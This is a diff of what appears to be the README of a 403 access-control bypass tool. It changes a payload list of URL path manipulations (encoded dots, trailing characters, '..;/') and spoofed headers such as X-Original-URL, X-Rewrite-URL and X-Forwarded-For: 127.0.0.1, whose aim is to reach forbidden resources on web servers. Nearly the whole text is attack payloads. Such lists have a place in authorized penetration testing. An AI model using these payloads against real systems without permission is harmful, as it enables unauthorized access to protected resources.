@@ -13,12 +13,17 @@ $1/%2e/$2
 $1/$2/.
 $1//$2//
 $1/./$2/./
-$1/$2anything -H "X-Original-URL: /$2" 
-$1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1" 
-$1 -H "X-Rewrite-URL: /$2"
+$1/$2anything -H "X-Original-URL: $2"
+$1 -H "X-Original-URL: $1" 
+$1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1"
+$1 -H "X-Rewrite-URL: $1"
+$1 -H "X-Rewrite-URL: $2"
 $1/$2 -H "Referer: /$2"
 $1/$2 -H "X-Originating-IP: 127.0.0.1"
 $1/$2 -H "X-Forwarded-For: 127.0.0.1"
+$1/$2 -H "X-Forwarded-For: 127.0.0.1:80"
+$1/$2 -H "X-Forwarded-For: 127.0.0.1:443"
+$1/$2 -H "X-Forwarded-For: http://127.0.0.1"
 $1/$2 -H "X-Remote-IP: 127.0.0.1"
 $1/$2 -H "X-Client-IP: 127.0.0.1"
 $1/$2 -H "X-Host: 127.0.0.1"
@@ -29,18 +34,14 @@ $1/$2?
 $1/$2???
 $1/$2//
 $1/$2/
-$1/$2/.randomstring
+$1/$2/.random
+$1/$2.json
+$1/$2%23
+$1/$2%26
+$1.//$2
 $1/$2..;/
 $1/$2%
-$1/$2%09/
-$1/$2../
-$1/$2..%2f
-$1/$2..%00/
-$1/$2..%0d/
-$1/$2..%5c
-$1/$2..%ff/
 $1/$2.%2e/
-$1/$2?radomstring
 ```
 
 ## Installation
